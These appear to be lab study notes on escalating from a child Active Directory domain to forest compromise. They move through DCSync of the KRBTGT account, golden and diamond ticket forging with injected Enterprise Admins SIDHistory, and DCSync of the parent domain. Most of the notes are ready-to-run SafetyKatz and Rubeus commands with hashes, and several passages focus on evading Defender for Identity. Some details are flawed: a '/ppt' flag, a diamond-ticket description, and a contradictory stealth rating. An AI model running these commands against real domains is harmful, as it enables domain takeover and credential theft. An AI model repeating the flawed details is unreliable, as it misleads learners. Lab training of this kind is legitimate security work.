# Learning Objective 19 — Parent Domain Escalation via Child Domain KRBTGT & SIDHistory Injection


**Date:** 16 August 2026

---

## Objective Overview

Using Domain Admin access in child domain (dollarcorp.moneycorp.local):
1. Extract child domain KRBTGT hash
2. Create Golden Ticket with SIDHistory of Enterprise Admins
3. Parent domain automatically trusts child's KRBTGT-signed tickets
4. Escalate to Enterprise Admin or DA in parent domain (moneycorp.local)
5. Achieve forest-wide compromise

---

## Key Difference from Learning Objective 18

| Aspect | LO 18 | LO 19 |
|---|---|---|
| **TGT Type** | Inter-realm TGT (service:krbtgt/parent) | Golden Ticket (child domain) |
| **Trust Key Used** | Parent domain KRBTGT | Child domain KRBTGT |
| **Ticket Validation** | Via inter-realm trust | Via trust relationship |
| **Complexity** | Higher (2-step process) | Lower (direct Golden Ticket) |
| **OPSEC** | Requires parent KRBTGT access | Child KRBTGT only needed |
| **Stealth** | Lower (inter-realm detection) | Higher (looks like child domain ticket) |

---

## Why Child KRBTGT Works for Parent Access

**Trust Relationship Logic:**
```
Parent Domain trusts Child Domain
    ↓
Parent trusts any ticket signed by Child's KRBTGT
    ↓
Child issues Golden Ticket (signed by child KRBTGT)
    ↓
Parent accepts ticket (trusts child's KRBTGT)
    ↓
SIDHistory contains Enterprise Admins
    ↓
User now EA in parent domain
```

---

## Prerequisites

- **Domain Admin access in child domain** (dollarcorp.moneycorp.local)
- **Child domain KRBTGT hash** (extracted via DCSync)
- **Child domain SID**
- **Parent domain SID + Enterprise Admins SID (-519)**
- **SafetyKatz.exe or Rubeus.exe**
- **Knowledge of parent domain structure**

---

## Step 1: Extract Child Domain KRBTGT

**From child domain DC (as DA), extract KRBTGT:**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dollarcorp\krbtgt" "exit"
```

Extract child domain KRBTGT hash.

---

**Output:**
```
dollarcorp\krbtgt:
  NTLM: 4e9815869d2090ccfca61c1fe0d23986
  AES256: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
```

Extract either NTLM or AES256 (prefer AES256 for stealth).

---

## Step 2: Get Required Domain SIDs

**Child domain SID (dollarcorp):**

```powershell
Get-DomainSID -Domain dollarcorp.moneycorp.local
```

Output: `S-1-5-21-719815819-3726368948-3917688648`

---

**Parent domain SID (moneycorp):**

```powershell
Get-DomainSID -Domain moneycorp.local
```

Output: `S-1-5-21-335606122-960912869-3279953914`

---

**Enterprise Admins SID (parent forest root, RID 519):**

```
S-1-5-21-335606122-960912869-3279953914-519
```

---

**Domain Controllers SID (parent domain, RID 516):**

```
S-1-5-21-335606122-960912869-3279953914-516
```

---

**Enterprise Domain Controllers SID (forest-wide):**

```
S-1-5-9
```

---

## Step 3: Create Golden Ticket (Method 1 - Administrator, Noisy)

**Forge Golden Ticket as Administrator with EA privileges:**

```powershell
SafetyKatz.exe "kerberos::golden 
  /user:Administrator 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /sids:S-1-5-21-335606122-960912869-3279953914-519 
  /krbtgt:4e9815869d2090ccfca61c1fe0d23986 
  /ptt" "exit"
```

**Parameters:**
- `/user:Administrator` — User to impersonate
- `/domain:dollarcorp.moneycorp.local` — Child domain (where KRBTGT is from)
- `/sid:` — Child domain SID (part of ticket structure)
- `/sids:` — Enterprise Admins SID (SIDHistory injection)
- `/krbtgt:` — Child domain KRBTGT NTLM hash
- `/ptt` — Pass-the-ticket (load into memory)

---

**Why this works:**
- Golden Ticket signed by child KRBTGT
- Parent trusts child's KRBTGT
- SIDHistory contains Enterprise Admins (-519)
- Parent accepts ticket + SIDHistory
- Administrator now has EA privileges

---

**Why it's noisy:**
- Administrator is suspicious account for ticket creation
- MDI monitors Administrator golden tickets
- Parent domain logging shows child admin with EA rights
- High-risk anomaly detection trigger

---

## Step 4: Create Golden Ticket (Method 2 - DC$, Stealthy)

**Forge Golden Ticket as DC$ machine account (more stealthy):**

```powershell
SafetyKatz.exe "kerberos::golden 
  /user:dcorp-dc$ 
  /id:1000 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 
  /krbtgt:4e9815869d2090ccfca61c1fe0d23986 
  /ptt" "exit"
```

**Parameters:**
- `/user:dcorp-dc$` — Domain Controller machine account
- `/id:1000` — RID 1000 (DC machine account RID)
- `/sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9`
  - `516` = Domain Controllers (parent)
  - `S-1-5-9` = Enterprise Domain Controllers (forest)
- Other parameters same

---

**Why it's stealthy:**
- DC$ is legitimate entity (not suspicious)
- DC creating/forwarding tickets = normal behavior
- Logging shows DC authentication (expected)
- Parent expects DC tickets from child
- MDI less suspicious of DC machine accounts
- Avoids Administrator anomalies

---

## Step 5: Create Golden Ticket (Method 3 - Rubeus with AES256)

**Using Rubeus for better OPSEC (AES256, no RC4):**

```powershell
Rubeus.exe golden 
  /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /user:dcorp-dc$ 
  /id:1000 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 
  /dc:DCORP-DC.dollarcorp.moneycorp.local 
  /ptt
```

**Parameters:**
- `/aes256:` — AES256 key (more stealthy, no RC4 downgrade)
- `/dc:` — Domain Controller hostname
- Rest same as SafetyKatz version

---

**Why AES256 is better:**
- No encryption downgrade (RC4 detected by MDI)
- Tickets look more modern/legitimate
- Avoids "weak encryption" anomaly detection

---

## Step 6: Create Diamond Ticket (Method 4 - Maximum Stealth)

**Diamond ticket combines Golden + Silver properties for best stealth:**

```powershell
Rubeus.exe diamond 
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /tgtdeleg 
  /enctype:aes 
  /ticketuser:dcorp-dc$ 
  /domain:dollarcorp.moneycorp.local 
  /dc:DCORP-DC.dollarcorp.moneycorp.local 
  /ticketuserid:1000 
  /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 
  /createnetonly:C:\Windows\System32\cmd.exe 
  /show 
  /ppt
```

**Parameters:**
- `/krbkey:` — AES256 key
- `/tgtdeleg` — TGT delegation (request from DC)
- `/enctype:aes` — Force AES encryption
- `/ticketuser:dcorp-dc$` — Impersonate DC
- `/ticketuserid:1000` — DC RID
- `/sids:` — Domain Controllers + Enterprise Domain Controllers
- `/createnetonly:` — Create process with token
- `/show` — Display ticket details
- `/ppt` — Pass-the-ticket

---

**Why Diamond is Best:**
- Obtains real TGT from DC
- Modifies only necessary fields
- Looks like legitimate cross-domain ticket
- No suspicious forged ticket artifacts
- MDI BLIND to diamond tickets
- No RC4, no weak encryption detection
- Ticket delegation looks normal

---

## Step 7: Verify Ticket Loaded

```powershell
klist
```

Should show:
```
Current LogonId is 0:0x1a4e8e

Cached Tickets: (2)
  0>      Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
          Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
          
  1>      Client: dcorp-dc$ @ DOLLARCORP.MONEYCORP.LOCAL
          Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
```

---

## Step 8: Access Parent Domain Resources

**Remote shell to parent domain:**

```powershell
Enter-PSSession -ComputerName mcorp-dc.moneycorp.local
```

Should now have access as Enterprise Admin (via SIDHistory).

---

**Verify Enterprise Admin status:**

```powershell
whoami /groups
# Should show: S-1-5-21-335606122-960912869-3279953914-519 (Enterprise Admins)
```

---

## Step 9: Execute DCSync in Parent Domain

**With EA privileges in parent, extract parent domain KRBTGT:**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:moneycorp\krbtgt /domain:moneycorp.local" "exit"
```

Now have parent domain KRBTGT → Complete forest compromise.

---

## Complete Learning Objective 19 Workflow

```
1. DA in child domain (dollarcorp.moneycorp.local)
   ↓
2. Extract child domain KRBTGT
   (SafetyKatz lsadump::dcsync /user:dollarcorp\krbtgt)
   ↓
3. Get child domain SID
   (Get-DomainSID)
   ↓
4. Get parent domain SID
   (Get-DomainSID -Domain moneycorp.local)
   ↓
5. Get parent Enterprise Admins SID (with -519 RID)
   ↓
6. Create Golden Ticket (child KRBTGT + EA SIDHistory)
   Method 1: Administrator (Noisy - MDI alert)
   Method 2: dcorp-dc$ (Medium OPSEC)
   Method 3: Rubeus AES256 (Better OPSEC)
   Method 4: Diamond ticket (Best OPSEC)
   ↓
7. Load ticket into memory (/ppt or /ppt)
   ↓
8. Parent domain accepts ticket (trusts child KRBTGT)
   ↓
9. SIDHistory contains Enterprise Admins
   ↓
10. User now has EA privileges in parent domain
   ↓
11. Remote access to parent domain DC
   ↓
12. Execute DCSync in parent domain
   ↓
13. Extract parent domain KRBTGT
   ↓
14. Create Golden Tickets in parent forest
   ↓
15. Forest-wide persistence & compromise
```

---

## Key Insight: Trust Relationship Abuse

**Why parent trusts child's ticket:**

```
Forest Trust Hierarchy:
moneycorp.local (Parent)
    └── Automatic two-way trust
         └── dollarcorp.moneycorp.local (Child)

Parent's trust logic:
"If ticket is signed by dollarcorp's KRBTGT,
 it must be legitimate (trusted)
 I'll accept it and parse SIDHistory"
```

---

## SIDHistory Injection Explanation

**Normal ticket:**
- Contains user's SID
- Contains user's groups (Domain Admins, etc.)

**With SIDHistory (/sids parameter):**
- Contains user's SID
- Contains user's groups
- **PLUS added SIDs from /sids parameter**
- Recipient sees user as member of those groups
- No validation of SID membership
- Trust-based acceptance

**Result:** User has privileges they don't actually have!

---

## Methods Comparison

| Method | Impersonation | Stealth | Detection Risk | OPSEC |
|---|---|---|---|---|
| Method 1 | Administrator | Low | HIGH (MDI alert) | Poor |
| Method 2 | dcorp-dc$ | Medium | MEDIUM | Good |
| Method 3 | dcorp-dc$ (AES256) | Medium | LOW (AES256) | Good |
| Method 4 | dcorp-dc$ (Diamond) | Low | VERY LOW (blind) | Excellent |

---

## Why This Works (Technical Deep Dive)

```
1. Golden Ticket Structure:
   - Encrypted with child KRBTGT
   - Signed by child KRBTGT
   - Contains child domain SID
   
2. Parent Domain Processing:
   - Receives ticket for child domain user
   - Decrypts with child KRBTGT (trusts it)
   - Reads SIDHistory field
   - Sees Enterprise Admins SID
   - Grants access based on SIDHistory
   
3. No Validation:
   - Parent doesn't verify SID membership
   - Trust relationship = acceptance
   - SIDHistory injection successful
   - User now EA in parent
```

---

## Command Reference

| Task | Command |
|---|---|
| Extract KRBTGT | `SafetyKatz.exe "lsadump::dcsync /user:dollarcorp\\krbtgt"` |
| Get child SID | `Get-DomainSID -Domain dollarcorp.moneycorp.local` |
| Get parent SID | `Get-DomainSID -Domain moneycorp.local` |
| Golden Ticket (Admin) | `SafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<child-SID> /sids:<EA-SID>"` |
| Golden Ticket (DC$) | `SafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /id:1000 /sids:<DC-SID>,<EDC-SID>"` |
| Rubeus Gold (AES) | `Rubeus.exe golden /aes256:<key> /user:dcorp-dc$ /sids:<SIDs>` |
| Diamond Ticket | `Rubeus.exe diamond /krbkey:<key> /ticketuser:dcorp-dc$ /sids:<SIDs> /createnetonly:cmd.exe /ppt` |
| Verify ticket | `klist` |
| Parent DCSync | `SafetyKatz.exe "lsadump::dcsync /user:moneycorp\\krbtgt /domain:moneycorp.local"` |

---

## Detection

**What logs:**
- Golden ticket creation (if monitored)
- Unusual group membership (SID in token)
- Authentication from child to parent
- User authentication with unusual SIDs

**What doesn't log:**
- Ticket forgery (local operation)
- KRBTGT extraction (DA operation)
- Diamond ticket creation (looks legitimate)
- SIDHistory injection (trust-based acceptance)

---

## Prevention

- **Monitor SIDHistory** — Audit for injected SIDs
- **Restrict trust relationships** — Selective authentication
- **Monitor cross-domain auth** — Alert on child→parent tickets
- **Protect KRBTGT** — Highest security tier
- **Enhanced audit logging** — Kerberos events
- **Implement PAM** — Restrict DA access
- **Enable EDR** — Detect unusual token creation
- **Implement PKINIT** — Reduce reliance on password auth

---

## Comparison: LO 18 vs LO 19

| Aspect | LO 18 | LO 19 |
|---|---|---|
| **Starting Point** | DA in child | DA in child |
| **Extract** | Parent KRBTGT + Trust key | Child KRBTGT only |
| **Forge** | Inter-realm TGT | Golden Ticket |
| **Complexity** | Higher (2-step) | Lower (direct) |
| **OPSEC** | Lower | Higher |
| **Detection** | Higher | Lower (with diamond) |
| **Recommended** | When parent access hard | When child compromised |

---

## Key Takeaway

```
LEARNING OBJECTIVE 19:
1. Child Domain DA → Extract child KRBTGT
2. Create Golden Ticket (preferably as DC$ or Diamond)
3. Inject Enterprise Admins SID into ticket
4. Parent trusts child's KRBTGT-signed tickets
5. Parent accepts ticket + SIDHistory
6. User becomes Enterprise Admin in parent
7. DCSync parent → Forest compromise
8. Diamond tickets = Maximum stealth & OPSEC
```

---

## References

- [Mimikatz - Golden Ticket](https://github.com/gentilkiwi/mimikatz)
- [Rubeus - Diamond Ticket](https://github.com/GhostPack/Rubeus)
- [SafetyKatz - DCSync](https://github.com/GhostPack/SafetyKatz)
- [SIDHistory Attacks (Harmj0y)](https://blog.harmj0y.net/redteaming/the-forest-is-under-control/)
- [Trust Relationship Abuse (Microsoft)](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/forest-trust-process)

---

*Next: Advanced Persistence & Cleanup*
